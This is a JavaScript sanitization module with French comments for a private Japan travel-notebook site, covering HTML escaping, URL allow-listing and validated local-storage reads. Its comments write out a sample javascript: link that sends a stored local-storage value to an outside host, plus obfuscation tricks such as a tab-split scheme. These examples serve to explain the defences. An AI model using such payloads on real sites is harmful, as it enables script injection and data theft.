/* Sûreté — les quatre gestes que tout le carnet doit faire de la même façon.
 *
 * Le carnet affiche des textes et des liens qui viennent d'ailleurs : légendes
 * Instagram, descriptions TikTok, notes recopiées à la main. Ces données sont
 * ensuite posées dans la page par `innerHTML`, parce que c'est ce qui rend 544
 * fiches en un seul geste. Tant qu'un seul champ échappe au filtre, la page
 * exécute ce que la donnée contient.
 *
 * Ce fichier rassemble donc, à un seul endroit :
 *
 *   · `echapper`  — le texte qui entre dans du HTML ;
 *   · `urlSure`   — l'adresse qui entre dans un `href` ou un `src` ;
 *   · `lire` / `ecrire` — le stockage local, qui peut mentir ;
 *   · `nombre`, `texte` — les valeurs qu'on croit être ce qu'elles disent.
 *
 * Il est chargé **avant** tous les autres scripts : `app.js`, `carte.js` et les
 * pages qui viendront s'en servent, et aucun ne redéfinit sa propre version.
 * Une deuxième implémentation d'`echapper` quelque part dans le carnet, c'est
 * la certitude qu'un jour l'une des deux oubliera un caractère.
 */

(function (global) {
  "use strict";

  /* ---------- le texte qui entre dans du HTML ------------------------------
   *
   * Six caractères, pas quatre. La version précédente en traitait quatre —
   * `& < > "` — ce qui suffit tant que **tous** les attributs sont écrits entre
   * guillemets doubles. C'est le cas aujourd'hui, et c'est exactement le genre
   * d'invariant qu'une ligne ajoutée un soir casse sans que personne ne le voie :
   *
   *     '<span title=' + echapper(x) + '>'      ← attribut nu
   *     "<span title='" + echapper(x) + "'>"    ← guillemets simples
   *
   * Dans les deux cas, une apostrophe ou une espace dans la donnée fait sortir
   * de l'attribut et ouvre la porte à `onerror=`. L'accent grave est là pour
   * une vieille particularité d'Internet Explorer, et ne coûte rien.
   */
  var TABLE = {
    "&": "&amp;", "<": "&lt;", ">": "&gt;",
    '"': "&quot;", "'": "&#39;", "`": "&#96;"
  };

  function echapper(s) {
    if (s === null || s === undefined) return "";
    return String(s).replace(/[&<>"'`]/g, function (c) { return TABLE[c]; });
  }

  /* ---------- l'adresse qui entre dans un href -----------------------------
   *
   * `echapper` ne protège **pas** un lien, et c'est le piège : il ne contient
   * aucun des six caractères filtrés.
   *
   *     javascript:fetch('https://…/'+localStorage.getItem('carnet-japon-envies'))
   *
   * Cette chaîne traverse l'échappement sans une égratignure, entre telle
   * quelle dans `href`, et s'exécute au premier doigt posé dessus — avec accès
   * à tout ce que la page sait. Vérifié le 17/09/2026 dans le carnet lui-même :
   * le lien produit avait bien `protocol === "javascript:"`.
   *
   * Un carnet dont les adresses de vidéos sont récoltées par des scripts sur
   * TikTok et Instagram ne peut pas faire confiance à ce champ. On n'accepte
   * donc que ce qui sert vraiment :
   *
   *   · `https:` — les vidéos, les cartes, tout l'extérieur ;
   *   · `http:`  — refusé, et ce n'est pas du zèle : le carnet se consulte en
   *                https, un lien en clair y est soit une faute de frappe, soit
   *                une dégradation voulue par quelqu'un d'autre ;
   *   · relatif  — les images du carnet lui-même (`img/…`), à condition de ne
   *                pas remonter hors du site ;
   *   · `tel:`   — seulement là où on le demande explicitement (les urgences),
   *                jamais depuis une donnée de fiche.
   *
   * Tout le reste rend "" — et l'appelant n'affiche pas de lien du tout. Une
   * adresse refusée n'est pas un lien mort à cliquer : c'est un lien absent.
   */
  function urlSure(u, options) {
    var o = options || {};
    if (!u) return "";
    var s = String(u).trim();
    if (!s) return "";

    /* Les caractères de contrôle servent à masquer un schéma interdit :
       `java\tscript:` est lu comme `javascript:` par le navigateur, qui ignore
       tabulations et retours à la ligne dans l'URL. On les ôte AVANT de lire le
       schéma, sinon on inspecte une chaîne que le navigateur ne verra pas. */
    s = s.replace(/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/g, "");

    // Un schéma explicite ? On le lit sur la chaîne nettoyée, sans casse.
    var schema = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(s);
    if (schema) {
      var nom = schema[1].toLowerCase();
      if (nom === "https") return s;
      if (nom === "tel" && o.telAutorise) {
        // Un numéro, et rien d'autre : chiffres, +, espaces, tirets, points,
        // # et * pour les services à code court (#7119 au Japon).
        return /^tel:[+0-9 .#*-]{3,24}$/.test(s) ? s : "";
      }
      return "";
    }

    /* Sans schéma, c'est un chemin du carnet. On refuse ce qui sort du site :
       `//pirate.example/x` est une URL absolue déguisée, et `../` remonte hors
       du dossier publié. */
    if (s.indexOf("//") === 0) return "";
    if (s.indexOf("\\") >= 0) return "";
    if (/(^|\/)\.\.(\/|$)/.test(s)) return "";
    return s;
  }

  /* Le lien tout fait, ou rien. Le « ou rien » est le point : partout où le
     carnet écrivait `'<a href="' + echapper(u) + '">'`, il écrit maintenant
     `Sur.lien(u, texte)`, et une adresse douteuse donne un texte inerte au lieu
     d'un piège cliquable.

     `rel="noopener noreferrer"` :
       · `noopener` empêche la page ouverte de reprendre la main sur la nôtre ;
       · `noreferrer` lui cache **d'où** on vient. Sans lui, chaque clic vers
         TikTok, Instagram ou Google apprend à ces sites l'adresse exacte du
         carnet de Paco — un carnet privé, dont le lien ne devrait circuler
         qu'entre six personnes. */
  function lien(u, texte, classe) {
    var sure = urlSure(u);
    var t = echapper(texte);
    if (!sure) return '<span class="lien-mort" title="adresse non reconnue">' + t + "</span>";
    return '<a href="' + echapper(sure) + '" target="_blank" ' +
           'rel="noopener noreferrer"' + (classe ? ' class="' + echapper(classe) + '"' : "") +
           ">" + t + "</a>";
  }

  /* ---------- le stockage local, qui peut mentir ---------------------------
   *
   * `localStorage` n'est pas un coffre : c'est un tiroir partagé par tout ce
   * qui tourne sur la même origine. Sur GitHub Pages, l'origine est le compte
   * entier — `<compte>.github.io` —, pas le dossier du carnet : n'importe quel
   * autre projet publié sous le même compte lit et écrit dans ce tiroir.
   *
   * On ne peut donc rien y mettre de sensible, et il faut relire ce qu'on en
   * sort comme on relirait un fichier trouvé par terre : la valeur peut avoir
   * été écrite par une version antérieure du carnet, par un autre projet, ou
   * par un doigt sur la console. `lire` passe la valeur au validateur fourni et
   * rend le défaut si elle ne tient pas.
   */
  function lire(cle, valider, defaut) {
    var brut;
    try { brut = global.localStorage.getItem(cle); }
    catch (e) { return defaut; }           // navigation privée, stockage coupé
    if (brut === null || brut === undefined) return defaut;
    if (brut.length > 2000000) return defaut;   // 2 Mo : ce n'est plus le carnet
    var v;
    try { v = JSON.parse(brut); }
    catch (e) { return defaut; }
    try { return valider(v) ? v : defaut; }
    catch (e) { return defaut; }
  }

  /* Rend `true` si l'écriture a eu lieu. Le faux compte : c'est ce qui permet
     de dire « votre plan n'a pas pu être enregistré » au lieu de le perdre en
     silence. Le quota est atteint plus vite qu'on ne croit sur un iPhone en
     navigation privée, où il vaut zéro. */
  function ecrire(cle, valeur) {
    try {
      global.localStorage.setItem(cle, JSON.stringify(valeur));
      return true;
    } catch (e) { return false; }
  }

  function oublier(cle) {
    try { global.localStorage.removeItem(cle); return true; }
    catch (e) { return false; }
  }

  /* ---------- les valeurs qu'on croit être ce qu'elles disent -------------- */

  /* Un objet plat dont les clés et les valeurs sont ce qu'on attend. Sert à
     valider ce qui sort du stockage : `{ "Nom|Ville": 1 }` et rien d'autre. */
  function estDictionnaireSimple(v, valeurOk, maxCles) {
    if (!v || typeof v !== "object" || Array.isArray(v)) return false;
    var cles = Object.keys(v);
    if (cles.length > (maxCles || 5000)) return false;
    for (var i = 0; i < cles.length; i++) {
      if (cles[i].length > 400) return false;
      if (valeurOk && !valeurOk(v[cles[i]])) return false;
    }
    return true;
  }

  /* Un texte propre : les caractères de contrôle ôtés, la longueur bornée.
     Utilisé sur ce que l'utilisateur tape (une note de journée) avant de le
     remettre dans la page ou dans un fichier d'export. */
  function texte(s, max) {
    if (s === null || s === undefined) return "";
    var t = String(s).replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g, "");
    if (max && t.length > max) t = t.slice(0, max);
    return t;
  }

  function nombre(v, min, max, defaut) {
    var n = typeof v === "number" ? v : parseFloat(v);
    if (!isFinite(n)) return defaut;
    if (min !== null && min !== undefined && n < min) return defaut;
    if (max !== null && max !== undefined && n > max) return defaut;
    return n;
  }

  global.Sur = {
    echapper: echapper,
    urlSure: urlSure,
    lien: lien,
    lire: lire,
    ecrire: ecrire,
    oublier: oublier,
    estDictionnaireSimple: estDictionnaireSimple,
    texte: texte,
    nombre: nombre
  };
})(window);
